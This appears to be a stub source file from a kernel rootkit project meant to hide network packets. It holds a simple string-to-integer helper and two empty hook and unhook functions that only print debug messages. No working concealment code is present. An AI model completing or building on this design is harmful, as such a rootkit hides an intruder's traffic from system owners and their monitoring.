/*
 * This file provides all the functionality needed for hiding packets.
 *
 */

#include "include.h"
#include "main.h"


/* Function to convert string to integer : Reuse appropriately */
/* Use in4_pton for converting delete this whenever you get that working */

int my_atoi(char *str)
{
        int res = 0;
        int mul = 1;
        char *ptr;

        for(ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
                if(*ptr < '0' || *ptr > '9')
                        return(-1);
                res += (*ptr - '0') * mul;
                mul *= 10;
        }
        return(res);
}

/* hooks all functions needed to hide packets */
void hook_packets(char *ipv4_address)
{
        ROOTKIT_DEBUG("Hooking the appropriate functions for hiding packets...\n");
	
}

/* unhooks all functions */
void unhook_packets(void)
{
        ROOTKIT_DEBUG("Unhooking everything... bye!\n");

}
